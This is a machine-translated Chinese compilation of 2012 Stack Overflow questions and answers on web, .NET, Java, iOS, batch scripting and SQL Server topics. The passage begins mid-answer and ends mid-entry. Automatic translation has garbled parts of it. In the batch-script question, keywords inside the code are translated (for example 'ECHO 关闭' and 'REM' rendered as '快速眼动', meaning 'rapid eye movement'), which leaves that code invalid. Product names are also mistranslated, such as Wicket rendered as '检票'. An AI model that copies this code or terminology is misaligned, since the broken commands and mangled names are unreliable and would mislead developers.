2.  获取被操作对象的 URL
3.  使用 OG 调试器抓取该对象的 OG 元数据
4.  获取值并使用此值作为 APPID`fb:app_id`转到[graph.facebook.com/APPID](http://graph.facebook.com/APPID)
5.  `namespace`从返回的 JSON 数组中获取值
6.  为上面的命名空间值询问 user_actions:namespace 和 friends_actions:namespace
7.  使用给定命名空间和操作名称的 graph.facebook.com/USERID/namespace:action 为用户获取操作

容易，对吧？

# asp.net - Sencha Touch 错误您正在尝试解码 ASP.NET 中返回的无效 JSON 字符串 HTML 页面

> ID：12820642
> 
> 赞同：3
> 
> 时间：2012-10-10T13:34:21.937
> 
> 标签：asp.net, json, sencha-touch

当我尝试将 JSON 字符串发布到客户端时，出现以下错误。

```
Uncaught Error: You're trying to decode an invalid JSON String: 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>

</title></head>
<body>
    <form method="post" action="WebForm1.aspx" id="form1">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE2MTY2ODcyMjlkZDU/UqTLS4JCyWg8lH2WKg+TKxlfMLv46f+TlE5HbZ5k" />
</div>

    <div>

    </div>
    </form>
</body>
</html> 
```

它返回所有 HTML 页面。我的服务器端代码是这样的：

```
var httpWebRequest = (HttpWebRequest)WebRequest.Create("http://localhost:59145/My%20Application.app/webapp/index.html");
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";
        string json = "{ \"myresultlist\": [ {\"uname\": \"1\",\"pass\": \"anne\" }, { \"uname\": \"2\", \"pass\": \"jack\" }, {\"uname\": \"3\", \"pass\": \"Tom\" } ]}";

        httpWebRequest.ContentLength = json.Length;

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {

            streamWriter.Write(json);
            streamWriter.Flush();
            streamWriter.Close();

        } 
```

有人有什么想法吗？如何仅向客户端发送 JSON 字符串？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T06:32:54.530

解决方案如下。

错误的原因是服务器端后期操作。

当我用这个块更改代码时，我得到了 json 字符串。

```
Response.Expires = 0;
Response.ContentType = "application/json";
        Response.Write("{ \"myresultlist\": [ {\"uname\": \"1\",\"pass\": \"anne\" }, { \"uname\": \"2\", \"pass\": \"jack\" }, {\"uname\": \"3\", \"pass\": \"Tom\" } ]}");
        Response.End(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T20:09:59.240

如果您的客户端正在执行`POST`，则您的服务器无法`POST`返回。不要设置`HTTP`方法等于`POST`.

看看这个服务器响应：

```
HTTP/1.1 200 OK
Date: Wed, 10 Oct 2012 19:58:46 GMT
Server: Apache/2.2.22 (Win64) PHP/5.4.3
Vary: Accept-Encoding,User-Agent
Content-Encoding: gzip
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/javascript; charset="iso-8859-1" 
```

# java - 检票面板析构函数 (Java)

> ID：12820652
> 
> 赞同：1
> 
> 时间：2012-10-10T13:34:52.903
> 
> 标签：java, wicket

当该面板在页面中被删除/替换时，Wicket 是否会通知该面板？

我在 Panel 的构造函数中添加了 JavaScript（初始化代码），当 Panel 被移除时需要释放一些资源。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T17:47:34.463

更高版本的 Wicket (1.4.0+) 具有 Component#onRemove() 方法，用于通知组件它正在从组件层次结构中删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-14T17:46:34.883

客户端还有 PubSub 系统，您可以在其中做您需要的事情。请参阅[https://cwiki.apache.org/confluence/display/WICKET/Wicket+Ajax#WicketAjax-GlobalAjaxcalllisteners](https://cwiki.apache.org/confluence/display/WICKET/Wicket+Ajax#WicketAjax-GlobalAjaxcalllisteners)和事件“/dom/node/removing”。

# xcode - 只为图中的特定区域着色 IPAD App Xcode

> ID：12820661
> 
> 赞同：2
> 
> 时间：2012-10-10T13:35:14.513
> 
> 标签：xcode, ipad, ios6

如何为 Mikey Mouse 等彩色人物创建应用程序，并在单击帽子时选择颜色，帽子是选定的颜色。

问题是如何绘制设计的特定区域，例如手臂或帽子领带？只为图中的特定区域着色。

图的链接示例：

[![数字](../Images/fa03e933695b3791d099ac606726eddc.png)](https://i.stack.imgur.com/hfDrT.gif)
[（来源：[xpg.com.br](http://www.not1.xpg.com.br/wp-content/uploads/2011/04/imagens-disney-colorir-mickey.gif)）]

# microsoft-metro - 禁用快照视图

> ID：12820674
> 
> 赞同：3
> 
> 时间：2012-10-10T13:35:45.850
> 
> 标签：microsoft-metro, windows-runtime, winrt-xaml

有没有办法在 Windows 8 Metro 应用程序中禁用快照视图模式？

编辑：我想做的是根本不允许用户捕捉应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T15:15:56.880

您可以从 xaml 中的 'Snapped' ViewState 中删除 StoryBoard 片段。这样，当它捕捉到时，什么都不会发生

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T17:01:16.890

感谢您的回答，但是我在 MSDN 中看到，如果您希望应用程序被接受，您的应用程序必须是可捕捉的，并且用户必须始终能够捕捉应用程序。 [http://social.msdn.microsoft.com/Forums/pl-PL/winappswithcsharp/thread/6a503769-2e6e-4abe-a18c-4200ad568bff](http://social.msdn.microsoft.com/Forums/pl-PL/winappswithcsharp/thread/6a503769-2e6e-4abe-a18c-4200ad568bff)

# java - 设置日历时 DAY_OF_WEEK 不正确

> ID：12820676
> 
> 赞同：2
> 
> 时间：2012-10-10T13:35:50.977
> 
> 标签：java, calendar, dayofweek

当我获得当前日期时，它会将我返回`4`为当前星期几。但是当我用 设置日期时`calendar.set(mYear, mMonth, mDay);`，我得到`7`的是星期几。我检查了日期是否相同，一切似乎都相同，但我得到了不同的一天。

```
SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
Date date = new Date();
Calendar calendario = Calendar.getInstance();    
Log.w("TAG",""+"********:"+calendario.get(Calendar.DAY_OF_WEEK));
Log.w(4);

mYear = "2012";
mMonth = "10";
mDay = "10";

Calendar calendario = Calendar.getInstance();
calendario.set(mYear, mMonth, mDay);
Log.w("TAG","---------: "+calendario.get(Calendar.DAY_OF_WEEK));
    Log.w(7); 
```

有谁知道这可能会发生？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-10T13:41:33.470

您可能的问题是[Calendar 使用从零开始的索引来表示 months](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Calendar.html#MONTH)。因此，如果您尝试将日历设置为[十月](http://docs.oracle.com/javase/1.5.0/docs/api/constant-values.html#java.util.Calendar.OCTOBER)，则必须使用 9，而不是 10。

这是日历的愚蠢和不一致吗？是的！改用[Joda-Time API](http://joda-time.sourceforge.net/)来处理日期和时间。据我所知，在[JSR 310](http://today.java.net/pub/a/today/2008/09/18/jsr-310-new-java-date-time-api.html)出现之前，它目前是事实上的标准。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:57:08.393

`int month=9;` `int year=2012`; `int day=10;` `calendario.set(2012, 9, 10);`

使用 9 表示 10 月份，因为月份 JAN-DEC 触发为 0-11。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-02-08T22:25:24.537

# c# - Visual Studio 在构建期间部署报表项

> ID：12820677
> 
> 赞同：1
> 
> 时间：2012-10-10T13:35:51.737
> 
> 标签：c#, wpf, deployment, build, crystal-reports

我正在开发一个使用 Crystal Reports WPF 的项目，因此我有一个应用程序正常运行所需的报告文件 (.rpt)。我希望有一种方法可以设置 Visual Studio，以便在我进行构建时将此文件部署到 bin。我宁愿不必建立一个部署项目，因为 MSI 似乎有点不必要。

任何想法都非常感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:56:37.020

尝试在解决方案资源管理器中选择 .rpt 文件并设置`Copy to Output Directory`为`Copy Always`

# javascript - 滑动 css 过渡缓慢

> ID：12820678
> 
> 赞同：3
> 
> 时间：2012-10-10T13:35:52.193
> 
> 标签：javascript, jquery, ipad, css

我正在尝试为 ipad 构建一个滑动菜单，其中滑动将导致来自下一个菜单点的内容将当前内容推出。

但是，几乎没有内容（或只有 div 中的图像），它非常流畅。但是，一旦我引入了一个更复杂的 DOM，它在启用触摸的 chrome 中就会变得迟缓，并且在 ipad3 和 ipad2 上无法使用。

我使用了 transform: translate3d 来启用硬件加速，但它似乎并没有削减它。有没有其他方法可以提高性能。我看过一些网站，它们以非常流畅的滑动动画呈现大量内容（例如[，移动剧本](http://www.themobileplaybook.com)），但我无法获得同样的感觉。

我使用[jquery.event.swipe](http://stephband.info/jquery.event.swipe/)插件来引入这种格式的代码：

```
 $(document).ready(function(){
    var $swipeArea = $("#swipeBox"),
        $pages = $swipeArea.find(".page"),
        $currentPage = $(".currentPage"),
        index = $pages.index($currentPage),
        width = $swipeArea.width();

    $swipeArea
    .on('swipeleft', function(e){
        if(index == $pages.length - 1 ) { return; }
        $pages.eq(index+1).trigger('switchPage');
    })
    .on('swiperight', function(e){
        if(index == 0) { return; }
        $pages.eq(index-1).trigger('switchPage');
    })
    .on('switchPage', function(e){
        $pages.eq(index).removeClass("currentPage");
        $(e.target).addClass("currentPage");
        index = $pages.index($(e.target))
    }); 
```

使用这个 CSS：

```
.swipeContentArea .page{
   -webkit-transform: translate3d(0,0,0);
   -moz-transform: translate3d(0,0,0);
   -ms-transform: translate3d(0,0,0);
   -o-transform: translate3d(0,0,0);
   transform: translate3d(0,0,0);
   position:absolute;
   left:-100%;
   height:100%;
   z-index:1;
   overflow-x:hidden;
} 
.swipeContentArea .page.currentPage{
   left:0;
   z-index:2;
}
.swipeContentArea .page.currentPage ~ .page {
   left:100%;
} 
```

和

```
 transition-property: left,height;
  transition-duration: 600ms; 
```

在 swipeArea 上进行 css 转换。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:53:17.617

我可能错了，但是设置 a `left`（并为其设置动画）与`translate3d`:`left`不是硬件加速的完全不同，而`translate3d` *is* . 这可能是它运行不顺畅的原因。

`translate3d`需要`x`,`y`和`z`形式的参数。如果您愿意，`x`可以作为水平轴、`y`垂直轴和“深度”轴。`z`不久前我遇到了类似的情况并创建了一个简单的 jquery 函数，该函数将计算我的滑动元素的宽度（在你的情况下；下一页），并设置`translate3d`一个负数（元素向左移动）或正数的样式（元素向右移动）`x`该元素上的值。

假设你的滑动元素是 1200px 宽，你可以通过设置它的样式来设置它的动画：

1.  该元素是下一页：`translate3d(1200px,0px,0px)`
2.  该元素是当前页面：`translate3d(0px,0px,0px)`
3.  该元素是上一页：`translate3d(-1200px,0px,0px)`

（如果元素有边距，不要忘记合并边距。只需将它们添加到`x`值中）

[这里有更多关于 CSS (3d) 变换的内容](http://css3.bradshawenterprises.com/transforms/)

# ios - IOS开发XCode4.2中的SQLite vs. Text文件

> ID：12820681
> 
> 赞同：-2
> 
> 时间：2012-10-10T13:35:55.870
> 
> 标签：ios, web-services, sqlite, text, xcode4

目前，我无法决定应该为我的 IOS 应用程序（目标到 ipad）使用文本文件还是 SQLite。我有 5000 条记录要从 Web 服务中检索并保存到某个存储库中。我的第一个想法是将所有记录保存到文本文件中，但它会变慢并且特定记录搜索的过程会很多。从文本文件中搜索比从数据库中搜索要麻烦得多。但我是 SQLite 的新手。我担心的是如果我使用 SQLite，它会影响用户吗？用户需要下载任何文件来运行应用程序吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:48:21.643

使用 SQLite（或者更好的是[Core Data](http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/CoreData/cdProgrammingGuide.html)）对用户没有影响。没有额外的下载或类似的东西。您将其构建到应用程序中，与最终用户无缝连接。所以做任何最适合你的解决方案的事情。

虽然你应该使用 Core Data，但如果你使用 SQLite，你应该考虑使用[FMDB](https://github.com/ccgus/fmdb)，它可以让你摆脱 SQLite 编程的束缚

# windows - 如何获取子进程的退出码？

> ID：12820682
> 
> 赞同：4
> 
> 时间：2012-10-10T13:35:59.837
> 
> 标签：windows, cmd

这是一个蝙蝠脚本：

```
@ECHO 关闭

REM如何获取子进程的退出码

SETLOCAL 启用延迟扩展
FOR /F "usebackq tokens=* delims=" %%i IN (
    `^
        tracert google.com ^
        ^& 退出 /B 5 ^
    `
） 做 （
    回声 [日志] %%i
)

REM 我在这里需要的是 "EXIT_CODE:5" ,
REM 但显示“EXIT_CODE:0”，求助！
快速眼动
REM ***注意***：没有临时文件或任何非 bat 样式支持，
欢迎使用 REM 确切的方式，这里仅适用于 bat-zone。
快速眼动
ECHO EXIT_CODE:%ERRORLEVEL%

本地化

暂停

```

我需要捕获子进程的输出和退出代码，然后在`for...in`语句中处理输出。但是，退出代码没有通过：

当子进程退出时，退出代码要么在语句完成后被主进程刷新，要么一开始`for...in`就没有传递。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:11:33.523

FOR IN() 子句中的命令在全新的 CMD.EXE 会话中运行，因此无法直接访问 ERRORLEVEL 或命令可能设置的任何环境变量。

通常最好和最简单的解决方案是使用临时文件：

```
yourCommand >output.txt
set exit_code=%errorlevel%
for /f "delims=" %%i in (output.txt) do processOutput
del output.txt 
```

但是您已声明不能使用临时文件。

唯一的选择是在 IN() 子句中回显 ERRORLEVEL，然后在 DO 子句中解析 ERRORLEVEL。回显 ERRORLEVEL 有点棘手，因为 %ERRORLEVEL% 在解析时被扩展，并且整个 IN() 子句被一次解析，因此 %ERRORLEVEL% 将始终为 0。

IN() 子句命令使用命令行上下文执行，而不是批处理上下文。新的 CMD.EXE 会话不会继承当前的延迟扩展状态 - 它默认为禁用延迟扩展。最简单的解决方案是使用 CALL 和适当的转义`%ERRORLEVEL%`来延迟扩展，直到您的命令执行之后。添加插入符号以转义命令上下文。然后百分比和插入符号加倍以逃避父批次 - `%%^^ERRORLEVEL%%`。

您需要使您的 ERRORLEVEL 消息唯一，以便您的 DO 子句可以将 ERRORLEVEL 与正常输出区分开来。

```
@echo off
setlocal enableDelayedExpansion
for /f "delims=" %%A in ('dir DoesNotExist^&call echo ::ERROR::%%^^ERRORLEVEL%%') do (
  set "ln=%%A"
  if "!ln:~0,9!" equ "::ERROR::" (
    set "EXIT_CODE=!LN:~9!"
  ) else (
    REM normal output - do whatever
    echo %%A
  )
)
echo EXIT_CODE=%EXIT_CODE% 
```

这是上面的一些示例输出

```
C:\test>test.bat
File Not Found
 Volume in drive C is OS
 Volume Serial Number is EE2C-5A11
 Directory of C:\test
EXIT_CODE=1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:22:48.537

程序的退出代码可以被读取`%ERRORLEVEL%`。要将其分配给`echo`以后的变量：

```
set exitstatus=%ERRORLEVEL%
echo %exitstatus% 
```

您可能会觉得Raymond Chen 的[这篇文章](http://blogs.msdn.com/b/oldnewthing/archive/2008/09/26/8965755.aspx)很有趣。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T22:31:59.110

正如 Mike Kwan 所说：评估`%errorlevel%`变量。由于您似乎想设置子进程的退出代码，您可以执行以下操作：

```
@echo off

call :trace google.com
echo EXIT_CODE:%errorlevel%

set text=
for /f "delims= tokens=*" %%l in (out.txt) do (
  set text=!text!^

%%l
)
echo !text!

goto end

:trace
tracert %1 >out.txt
exit /b 5

:end
pause 
```

**编辑：**更新了代码以将输出读入变量。

# c# - 广泛使用后 TeeChart 呈现锯齿状字体

> ID：12820688
> 
> 赞同：1
> 
> 时间：2012-10-10T13:36:19.410
> 
> 标签：c#, .net, charts, teechart

我在使用 TeeChart .NET 组件和更改字体时看到了一种情况，在运行一段时间（约 5-20 天）后，图表将开始呈现可怕的锯齿状字体。这是在使用 .NET 构建的 Web 应用程序中，它将图表呈现到文件系统，然后从那里提供它们。

在这个错误发生后，除了图表看起来很糟糕之外，一切都会继续完美运行，直到我重新启动机器。重新启动后一切看起来都很好，直到在不确定的时间（通常在 2 周内）之后，问题再次出现。

以下是显示该错误的图表的图示：

[破碎的饼图 http://geekp.dk/teechart/ugly.png](http://geekp.dk/teechart/ugly.png)

此图表的正确再现是在尝试修复上述问题重新启动后立即生成的，如下所示：

[正确的饼图 http://geekp.dk/teechart/correct.png](http://geekp.dk/teechart/correct.png)

这个问题在网络中所有类型的图表中都是全局性的，并且一旦发生（不是一次一个或这样的）总是显示在所有图表中。

这里使用的字体是 Calibri，它的创建方式如下，然后使用 (System.Drawing) Font-object 指定 TeeChart "ChartFont" 对象的 .Name 和 .Size。

```
Font font = new Font("Calibri", 15); 
```

我不知道字体与此有关，这只是我的猜测。

这个问题似乎会在它发生后影响机器创建的所有图表。我有一个不同的网站，它的图表使用默认的 TeeChart 字体，每当问题发生时都会显示问题。但是，将该网站移至另一台机器后，它并没有显示此行为。但是，它仍然使用特殊字体在网络上发生。该网站也是生成最多图表的网站（估计每 5 秒生成 1-2 个图表）。

有没有人对要检查的事情有任何想法，或者您以前在 TeeChart 中看到过类似的行为吗？

编辑：TeeChart 版本为 4.0.2010.13051。

# file - Win32 - 获得将文件保存到C盘的权限

> ID：12820689
> 
> 赞同：2
> 
> 时间：2012-10-10T13:36:20.940
> 
> 标签：file, winapi, permissions, uac, privileges

我有一个程序，用户可以将输出会话保存到文本文件中。这很好用，但是当我尝试将文件保存到诸如 的位置时`C:\`，它会显示一个错误对话框：

`You don't have permission to save to this location. Contact the administrator to obtain permission. Would you like to save to the Documents folder instead?`

当我单击否时，认为它只会取消操作，我的应用程序崩溃了。我不希望我的应用程序*需要*管理权限，但是在尝试保存文件时，我如何要求用户提供权限（例如打开 UAC 对话框，如果需要，提供身份验证）。如果用户无法提供权限，我只想留在“保存文件”对话框上，直到用户选择他们有权保存到的位置，或者按取消。我真的不想在程序启动时询问权限，只是在用户将文件保存到他们需要权限的位置时。

顺便说一句，我目前在运行我的应用程序时以管理员身份登录，它是我计算机上运行 Windows Vista 的唯一帐户。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:42:57.907

应用程序仅在启动时提升。要模拟“在运行时且仅在需要时获取 UAC 权限”，您实际上需要对您的应用程序进行分区，以便它启动第二个进程（例如，写入文件）并且该进程可能会被提升。你可以这样做，但它需要做很多工作，但收效甚微或毫无益处。

UAC 的全部意义在于改变用户和应用程序对待硬盘的方式。C 的根不是写东西的聪明地方。使用 AppData 或 Documents，或创建您自己的文件夹，如 C:\MySpecialApp（将路径添加到配置文件）并在那里写入。如果您坚持写入 C 的根目录，那么您需要管理员权限，这没有多大意义。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-12-30T02:10:06.930

跟着这些步骤：

1.  右键单击驱动器并选择属性，然后转到安全选项卡，然后单击编辑。

2.  将打开一个新窗口，现在在“组和用户名”下，从列表中选择您要拒绝/允许访问特定文件夹的用户，现在在“用户权限”下选中修改旁边的拒绝/允许复选框（所有其他复选框将自动勾选）。

3.  单击确定，然后在弹出 Windows 安全性窗口时单击是。

4.  现在再次单击确定，您就完成了

# drupal-6 - 如何在 drupal 站点中包含 jwplayer

> ID：12820698
> 
> 赞同：0
> 
> 时间：2012-10-10T13:36:47.617
> 
> 标签：drupal-6, jwplayer

我在我的 drupal 站点中安装了一个 JW 播放器，并将视频链接包含在其中以在 jw 播放器中显示视频。但是视频没有播放进去。请如果有人可以提供帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T14:47:14.890

也许更多信息会有所帮助。

为了安全起见，请按照此处的配置向导进行操作：

[http://www.longtailvideo.com/support/jw-player-setup-wizard](http://www.longtailvideo.com/support/jw-player-setup-wizard)

复制代码并将其放在您希望它出现的相应drupal 部分。

如果问题仍然存在，请输入错误消息，以便我们更具体。

# php - Fancybox 与 PHP readfile() img 源

> ID：12820700
> 
> 赞同：1
> 
> 时间：2012-10-10T13:37:07.040
> 
> 标签：php, jquery, html, image-processing, fancybox

为了保证用户图像的安全，我将它们存储在 webroot 之外，并在附加的“image.php”脚本中通过 id 检查来调用它们。该脚本如下所示。

```
session_start();
require("scripts/sqlconnect.php"); 
$id = $_SESSION['id'];
$img = $_GET['id'];
$img = stripslashes($img);
$img = strip_tags($img);
$sql = mysql_query("SELECT * FROM photos WHERE id='$id'");   
$salt = mysql_query("SELECT * FROM members WHERE id='$id'");
$salt = mysql_fetch_array($salt);
$salt = $salt['salt'];
while($row = mysql_fetch_assoc($sql)){
    $imgfp = $row['filepath'];
    if(hash('sha256', $imgfp.$salt)==$img){
        $data = getimagesize($imgfp);
        if(!$data){
            header('HTTP/1.0 403 Forbidden');
            die('The file you requested is not an image.');
        }
        header('Content-type: ' .$data['mime']);
        header('Content-length: ' .filesize($imgfp));
        readfile($imgfp);
    }
} 
```

我遇到的问题是使用 FancyBox 和这样的脚本。当我链接到这些图像（如下所示）时，FancyBox 无法工作，它只是直接链接到图像。有没有人有使用 FancyBox 或类似脚本的经验来满足这种调用图像的方法？

```
<a class="fancybox" rel="'.$relgroup.'" href="image?id='.$photofp.'" title="'.$pinfo.'"><img class="tnail" src="'.$tnail.'" /></a> 
```

为 FancyBox 添加的 onload js 是这样的：

```
$(".fancybox")
    .fancybox({
        padding : 0,
        'scrolling' : 'no',
        helpers : {
            title   : {
            type: 'outside'
            },
        }
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T16:44:33.053

在上面的评论中，我**在肯尼迪国际机场的帮助下**弄清楚了这一点。

我创建了一个新类`.fancyboximg`，并将图像类型与开篇文章中所述的原始 onload 更改一起添加到该类中。

图像现在可以根据需要在 FancyBox 中打开！

```
$(".fancyboximg")
.fancybox({
    'type' : 'image',
    padding : 0,
    'scrolling' : 'no',
    helpers : {
        title   : {
        type: 'outside'
        },
    }
}); 
```

# sql-server - SQL Server Management Studio Express 不显示最近添加的数据

> ID：12820703
> 
> 赞同：2
> 
> 时间：2012-10-10T13:37:26.850
> 
> 标签：sql-server, database-connection

我最近安装并一直在使用 Microsoft SQL Server Management Studio Express 9.00.4035.00 来管理我主机的 SQL Server 2005 上的远程数据库。

到目前为止，我一直在使用 EMS SQL Manager 2011 Lite，并且运行良好。

今天早上在我的一张表中插入了 2 行新行；一个是客户注册的服务，另一个是我的测试注册。

当我运行典型的选择查询时：

```
[Select top 20 * From tblNotary Order By ID Desc] 
```

我没有看到最近的 2 行。但是当我从 EMS SQL Manager Lite 运行相同的查询时，我看到了记录。

我还验证了使用 MS Access 2010 连接时，我在表中看到了 2 个新行。我已经检查并仔细检查了连接设置，它们与 EMS 匹配。

是否有设置或明显的我缺少的东西？为什么我看不到最近的记录插入？我在 Windows 7 台式机上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:26:28.850

最可能的原因是您连接到的数据库与您预期的不同。您可以[`select @@servername`](http://msdn.microsoft.com/en-us/library/ms187944.aspx)验证两个查询是否针对同一台服务器运行。

如果记录仍然作为打开事务的一部分插入并且尚未提交，则它们被称为“幻像”行。如果您的查询在[事务隔离级别](http://msdn.microsoft.com/en-us/library/ms173763.aspx) `read committed`或更高级别运行，您将看不到幻影行。可能是 EMS SQL Manager Lite 正在运行`read uncommitted`，在这种情况下，它将在查询中包含幻像行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:46:57.420

有时连接字符串是一件棘手的事情。运行这个来仔细检查：

```
select @@servername servername, name, crdate  
from sys.sysdatabases 
where name = db_name() 
```

如果您在运行时遇到问题，只需做一个更简单的版本：

```
select @@servername, db_name(), @@version 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:48:51.797

```
Select top 20 * From tblNotary Order By ID Desc 
```

# objective-c - 单例二传手认为它正在接收一个 int *？

> ID：12820706
> 
> 赞同：0
> 
> 时间：2012-10-10T13:37:37.970
> 
> 标签：objective-c

我有以下代码：

```
#import <Foundation/Foundation.h>
#import "Game.h"

@interface World : NSObject

@property (nonatomic, strong) Game *game;

+(id)sharedInstance;

//---------------------------------------

#import "World.h"

@implementation World

@synthesize game = _game;

+(id)sharedInstance {
    DEFINE_SHARED_INSTANCE_USING_BLOCK(^{
    return [[self alloc] init];
});
} 
```

然而，当我尝试设置游戏属性时：

```
-(id)initWithLevelIdentifier:(int)identifier {
    if (self = [super init]) {
        self.currentLevel = [[Level alloc] initWithIdentifier:identifier];
        // stuff

        [[World sharedInstance] setGame:self];
    }

    return self;
} 
```

我得到：“无法使用‘Game *__strong’类型的左值初始化‘int *’类型的参数”

当它被明确指定为游戏类型时，为什么它认为这是一个 int *？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:02:59.250

你在这里有一个循环依赖。我打赌`Game.h`也进口`World.h`。在使用 Clang 的标头编译时间中查看[@class 与 #import 的对比？](https://stackoverflow.com/questions/7271146/class-vs-import-in-header-compile-time-saving-with-clang/7271910#7271910).

解决方案是只注意`World.h`这`Game`是一个类，但不导入标题：

```
#import <Foundation/Foundation.h>

@class Game;    // <=== rather than #import

@interface World : NSObject

@property (nonatomic, strong) Game *game;

+(id)sharedInstance; 
```

* * *

请注意，您的代码也存在设计问题。仅仅创建一个`Game`对象的行为就改变了当前的`World`游戏。这意味着很难将其`Game`视为非单例（仅创建它会修改全局状态），但`Game`也不是单例。这是初始化方法中非常令人惊讶的行为。最好将`setGame:`呼叫移出`init`并让呼叫者决定这是否是现在的全球当前游戏。将其放入`World`as 是合理的`-[World createNewGame]`。

# c# - 使用 C# 复制文件

> ID：12820708
> 
> 赞同：0
> 
> 时间：2012-10-10T13:37:41.980
> 
> 标签：c#, filestream

> **可能重复：**
> [在两个 Stream 实例之间复制的最佳方式 - C#](https://stackoverflow.com/questions/230128/best-way-to-copy-between-two-stream-instances-c-sharp)

我知道我可以使用 File.Copy 但是，我更感兴趣的是做更长的路，只是为了教育目的。

现在，我要讨论的方法是使用 StreamReader 和 StreamWriter（或 FileStreams）。

在我看来，我会将文件（作为二进制文件）读入内存，然后将文件写入新位置。这让我觉得有潜在的错误，因为
1）整个文件正在加载到内存中（我不知道文件有多大）和
2）与复制一个字节，粘贴一个字节之类的东西相比，它会很耗时（我认为这是流式传输的工作方式），因为我们必须等待整个文件存储在内存中，然后才能开始粘贴。

那么，很长的路要问，我将如何流式传输复制和粘贴作业？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:42:23.217

> 那么，很长的路要问，我将如何流式传输复制和粘贴作业？

不是将每个字节分别读入内存，也不是将整个*文件*读入内存，而是在中间进行 - 创建一个缓冲区，例如 32K，并要求输入流读取那么多数据。写出你读过的字节数，然后重复直到没有更多的数据要读。所以像：

```
public void Copy(Stream input, Stream output)
{
    byte[] buffer = new byte[32 * 1024];
    int bytesRead;
    while ((bytesRead = input.Read(buffer, 0, buffer.Length)) != 0)
    {
        output.Write(buffer, 0, bytesRead);
    }
} 
```

这并不像它*可能*的那样有效，因为您不是同时阅读和写作。异步 IO 可以解决这个问题，但会使它*变得*更加复杂——而且操作系统完全有可能足够聪明，可以在你写作的同时继续阅读......

请注意，除非您实际上正在阅读文本，否则您肯定会想要使用`Stream`而不是`TextReader`/ 。`TextWriter`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:43:24.613

您可以以 1 MB 的块为单位读取/写入文件（例如）。[MSDN 有一个例子](http://msdn.microsoft.com/en-us/library/9kstw824.aspx)展示了如何做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:42:36.310

1.  创建一个空的目标文件
2.  从源文件中读取一个缓冲区（比如说 1024 字节）
3.  将缓冲区写入目标文件
4.  重复 2 直到一切都完成

# windows-phone-7 - 保存到 isolatedStorageSettings 的问题

> ID：12820713
> 
> 赞同：0
> 
> 时间：2012-10-10T13:38:10.540
> 
> 标签：windows-phone-7

当我将数据（字符串）保存到隔离数据存储时，它成功保存了数据，但是在从数据存储中检索数据时，我获取了上一页的数据。我在 App.xaml.cs 中有字符串变量，我从页面为其分配值，在停用应用程序时，最后一页的信息被保存，当我恢复它时，我应该得到我保存的字符串，但这是我的地方遇到这个问题，我在前一个或之前的页面值有一段时间，如果我删除应用程序并成功构建应用程序，它会成功运行，但是当不删除应用程序并继续进行构建和构建过程时，我遇到了这个问题.

```
if (IsolatedStorageSettings.ApplicationSettings.Contains("endResponse"))
      {
          IsolatedStorageSettings.ApplicationSettings[endResponse] = App.endResponse;
      }
      else
      {
          settings.Add("endResponse", App.endResponse);
      } 
```

并且为了检索我正在使用

```
 if (IsolatedStorageSettings.ApplicationSettings.Contains("endResponse"))
             {
                 IsolatedStorageSettings.ApplicationSettings.TryGetValue<String>("endResponse", out App.endResponse);

             }
             Debug.WriteLine("App.end Response in IsolatedStorage while activation>>>" + App.endResponse); 
```

从模拟器中删除应用程序并在测试应用程序时，它运行良好，除此之外我并没有总是得到准确的值。

我附上了问题的截图，请检查并告诉我，如果我错过了什么。

![在此处输入图像描述](../Images/528666d606c2b5d7bf41134ae732a68e.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T07:38:36.940

你不应该使用

```
IsolatedStorageSettings.ApplicationSettings["endResponse"] 
```

而不是你的帖子中的这个？

```
IsolatedStorageSettings.ApplicationSettings[endResponse] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:53:41.003

编写设置后，您需要调用 Save 方法：-

[http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragesettings.save%28v=vs.95%29.aspx](http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragesettings.save%28v=vs.95%29.aspx)

# playframework - 将外部 Jar 文件添加到 Play 2.0.4

> ID：12820715
> 
> 赞同：1
> 
